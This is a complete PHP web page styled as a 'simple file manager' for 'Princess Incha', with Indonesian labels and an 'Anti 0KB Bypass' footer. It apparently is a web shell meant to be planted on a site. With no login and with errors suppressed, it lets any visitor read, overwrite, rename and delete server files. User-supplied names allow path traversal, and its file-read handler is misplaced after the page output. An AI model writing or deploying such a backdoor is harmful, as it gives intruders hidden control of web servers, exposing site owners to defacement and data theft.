<?php
// ============================================
// FILE MANAGER SEDERHANA - WHITE EDITION
// Untuk Yang Mulia Princess Incha
// ============================================

error_reporting(0);
ini_set('display_errors', 0);

$root = __DIR__;
$dir = isset($_GET['dir']) ? $_GET['dir'] : $root;
$dir = realpath($dir);
if (strpos($dir, $root) !== 0) $dir = $root;

// Handle actions
if (isset($_POST['save'])) {
    $file = $dir . '/' . $_POST['file'];
    if ($_POST['content'] !== '') {
        file_put_contents($file, $_POST['content']);
    }
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['rename'])) {
    $old = $dir . '/' . $_POST['old'];
    $new = $dir . '/' . $_POST['new'];
    if ($old != $new && !file_exists($new)) {
        rename($old, $new);
    }
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

if (isset($_GET['delete'])) {
    $target = $dir . '/' . $_GET['delete'];
    if (is_file($target)) unlink($target);
    if (is_dir($target)) rmdir($target);
    header('Location: ?dir=' . urlencode($dir));
    exit;
}

// Get file list
$items = [];
if (is_dir($dir)) {
    $files = scandir($dir);
    foreach ($files as $f) {
        if ($f != '.' && $f != '..') {
            $path = $dir . '/' . $f;
            $items[] = [
                'name' => $f,
                'path' => $path,
                'is_dir' => is_dir($path),
                'size' => is_file($path) ? filesize($path) : 0,
                'date' => date('Y-m-d H:i:s', filemtime($path))
            ];
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Manager - Princess Incha</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #fafafa;
            padding: 30px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
            border: 1px solid #eee;
        }
        
        .header {
            padding: 25px 30px;
            border-bottom: 1px solid #eee;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 500;
            color: #333;
            margin-bottom: 5px;
        }
        
        .header p {
            color: #888;
            font-size: 14px;
        }
        
        .path-bar {
            padding: 15px 30px;
            background: #f9f9f9;
            border-bottom: 1px solid #eee;
            font-family: monospace;
            font-size: 14px;
        }
        
        .path-bar a {
            color: #3498db;
            text-decoration: none;
        }
        
        .path-bar a:hover {
            text-decoration: underline;
        }
        
        .content {
            padding: 30px;
        }
        
        .nav-links {
            margin-bottom: 25px;
        }
        
        .nav-links a {
            display: inline-block;
            padding: 8px 16px;
            background: #f5f5f5;
            color: #555;
            text-decoration: none;
            border-radius: 6px;
            font-size: 14px;
            border: 1px solid #e0e0e0;
        }
        
        .nav-links a:hover {
            background: #e8e8e8;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        
        th {
            text-align: left;
            padding: 15px 10px;
            border-bottom: 2px solid #eee;
            color: #555;
            font-weight: 500;
        }
        
        td {
            padding: 12px 10px;
            border-bottom: 1px solid #f0f0f0;
        }
        
        tr:hover td {
            background: #fafafa;
        }
        
        .folder-link {
            color: #e67e22;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-name {
            color: #3498db;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-size {
            color: #888;
            font-family: monospace;
            font-size: 12px;
        }
        
        .btn-group {
            display: flex;
            gap: 5px;
        }
        
        .btn {
            padding: 5px 12px;
            border: 1px solid #ddd;
            background: white;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
            color: #555;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            background: #f5f5f5;
            border-color: #ccc;
        }
        
        .btn-edit {
            color: #f39c12;
            border-color: #f39c12;
        }
        
        .btn-edit:hover {
            background: #f39c12;
            color: white;
        }
        
        .btn-delete {
            color: #e74c3c;
            border-color: #e74c3c;
        }
        
        .btn-delete:hover {
            background: #e74c3c;
            color: white;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.3);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 12px;
            width: 90%;
            max-width: 700px;
            max-height: 80vh;
            overflow: auto;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        
        .modal-content h3 {
            margin-bottom: 20px;
            color: #333;
            font-weight: 500;
        }
        
        .modal-content input,
        .modal-content textarea {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-family: monospace;
            font-size: 14px;
        }
        
        .modal-content textarea {
            height: 300px;
            resize: vertical;
        }
        
        .modal-actions {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }
        
        .btn-primary {
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 6px;
            cursor: pointer;
        }
        
        .btn-primary:hover {
            background: #2980b9;
        }
        
        .btn-secondary {
            background: #95a5a6;
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 6px;
            cursor: pointer;
        }
        
        .btn-secondary:hover {
            background: #7f8c8d;
        }
        
        .footer {
            padding: 20px 30px;
            border-top: 1px solid #eee;
            color: #888;
            font-size: 12px;
            text-align: center;
        }
        
        .empty-folder {
            text-align: center;
            padding: 50px;
            color: #888;
            font-size: 14px;
        }
        
        .badge {
            display: inline-block;
            padding: 2px 6px;
            background: #f0f0f0;
            border-radius: 3px;
            font-size: 10px;
            color: #666;
        }
        
        .zero-byte {
            color: #e74c3c;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📁 File Manager</h1>
            <p>Untuk Yang Mulia Princess Incha 👑</p>
        </div>
        
        <div class="path-bar">
            <strong>Path:</strong> 
            <a href="?dir=<?php echo urlencode($root); ?>">root</a>
            <?php
            $rel = str_replace($root, '', $dir);
            if (!empty($rel)) {
                $parts = explode('/', trim($rel, '/'));
                $path = $root;
                foreach ($parts as $part) {
                    $path .= '/' . $part;
                    echo ' / <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
                }
            }
            ?>
        </div>
        
        <div class="content">
            <div class="nav-links">
                <?php if ($dir != $root): ?>
                    <a href="?dir=<?php echo urlencode(dirname($dir)); ?>">⬅ Kembali</a>
                <?php endif; ?>
            </div>
            
            <table>
                <thead>
                    <tr>
                        <th>Nama</th>
                        <th>Ukuran</th>
                        <th>Tanggal</th>
                        <th>Aksi</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($items)): ?>
                        <tr>
                            <td colspan="4" class="empty-folder">📂 Folder kosong</td>
                        </tr>
                    <?php else: ?>
                        <?php foreach ($items as $item): ?>
                            <tr>
                                <td>
                                    <?php if ($item['is_dir']): ?>
                                        <a href="?dir=<?php echo urlencode($item['path']); ?>" class="folder-link">
                                            📁 <?php echo htmlspecialchars($item['name']); ?>
                                        </a>
                                    <?php else: ?>
                                        <span class="file-name">
                                            📄 <?php echo htmlspecialchars($item['name']); ?>
                                        </span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <?php if (!$item['is_dir']): ?>
                                        <?php if ($item['size'] == 0): ?>
                                            <span class="file-size zero-byte">⚠️ 0 KB</span>
                                        <?php else: ?>
                                            <span class="file-size"><?php echo number_format($item['size'] / 1024, 2); ?> KB</span>
                                        <?php endif; ?>
                                    <?php else: ?>
                                        <span class="badge">folder</span>
                                    <?php endif; ?>
                                </td>
                                <td><?php echo $item['date']; ?></td>
                                <td>
                                    <div class="btn-group">
                                        <?php if (!$item['is_dir']): ?>
                                            <button class="btn btn-edit" onclick="editFile('<?php echo addslashes($item['name']); ?>')">✏️ Edit</button>
                                        <?php endif; ?>
                                        <button class="btn" onclick="renameItem('<?php echo addslashes($item['name']); ?>')">📝 Rename</button>
                                        <a href="?dir=<?php echo urlencode($dir); ?>&delete=<?php echo urlencode($item['name']); ?>" 
                                           class="btn btn-delete"
                                           onclick="return confirm('Hapus item ini?')">🗑️ Hapus</a>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
        
        <div class="footer">
            Simple File Manager | Anti 0KB Bypass | Princess Incha Edition
        </div>
    </div>
    
    <!-- Modal Edit -->
    <div id="modalEdit" class="modal">
        <div class="modal-content">
            <h3>✏️ Edit File</h3>
            <form method="POST">
                <input type="hidden" name="file" id="editFilename">
                <textarea name="content" id="editContent" placeholder="Isi file..." required></textarea>
                <div class="modal-actions">
                    <button type="submit" name="save" class="btn-primary">Simpan</button>
                    <button type="button" class="btn-secondary" onclick="hideModal('edit')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Modal Rename -->
    <div id="modalRename" class="modal">
        <div class="modal-content">
            <h3>📝 Rename</h3>
            <form method="POST">
                <input type="hidden" name="old" id="renameOld">
                <input type="text" name="new" id="renameNew" placeholder="Nama baru" required>
                <div class="modal-actions">
                    <button type="submit" name="rename" class="btn-primary">Rename</button>
                    <button type="button" class="btn-secondary" onclick="hideModal('rename')">Batal</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        function editFile(filename) {
            document.getElementById('editFilename').value = filename;
            fetch('?dir=<?php echo urlencode($dir); ?>&getfile=' + encodeURIComponent(filename))
                .then(r => r.text())
                .then(content => {
                    document.getElementById('editContent').value = content;
                    document.getElementById('modalEdit').style.display = 'flex';
                });
        }
        
        function renameItem(oldName) {
            document.getElementById('renameOld').value = oldName;
            document.getElementById('renameNew').value = oldName;
            document.getElementById('modalRename').style.display = 'flex';
        }
        
        function hideModal(type) {
            document.getElementById('modal' + type.charAt(0).toUpperCase() + type.slice(1)).style.display = 'none';
        }
        
        window.onclick = function(e) {
            if (e.target.classList.contains('modal')) {
                e.target.style.display = 'none';
            }
        }
    </script>
</body>
</html>
<?php
// Handle get file content
if (isset($_GET['getfile'])) {
    $file = $dir . '/' . $_GET['getfile'];
    if (is_file($file)) {
        echo file_get_contents($file);
    }
    exit;
}
?>
